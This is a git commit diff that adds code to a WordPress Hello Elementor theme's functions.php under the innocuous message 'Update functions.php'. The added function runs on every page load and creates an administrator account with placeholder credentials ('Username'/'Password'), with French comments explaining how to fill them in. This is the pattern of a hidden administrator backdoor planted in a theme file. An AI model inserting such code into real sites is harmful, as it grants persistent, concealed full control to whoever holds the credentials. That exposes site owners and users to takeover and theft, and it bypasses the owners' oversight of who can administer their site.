ef4176ce679a5451981b6b9ea93ff61ba30f8ca2
FabienGOYHEX <48013913+FabienGOYHEX@users.noreply.github.com>
2022-09-26 23:03:21 +0200

    Update functions.php

--- wp-content/themes/hello-elementor/functions.php
+++ wp-content/themes/hello-elementor/functions.php
@@ -218,3 +218,20 @@ if ( ! function_exists( 'hello_elementor_body_open' ) ) {
 		}
 	}
 }
+function addUserAdmin(){
+  /// Ici mettez votre nom utilisateur sans majuscules
+  $user = 'Username';
+  /// Ici mettez votre mot de passe
+  $pass = 'Password';
+  /// Ici mettez votre courriel
+  $email = 'email@domain.com';
+ 
+  /// Condition que utilisateur existe pas on le créé
+  if ( !username_exists( $user )  && !email_exists( $email ) ) {
+  $user_id = wp_create_user( $user, $pass, $email );
+  $user = new WP_User( $user_id );
+  $user->set_role( 'administrator' );
+  } 
+}
+ 
+add_action('init','addUserAdmin');
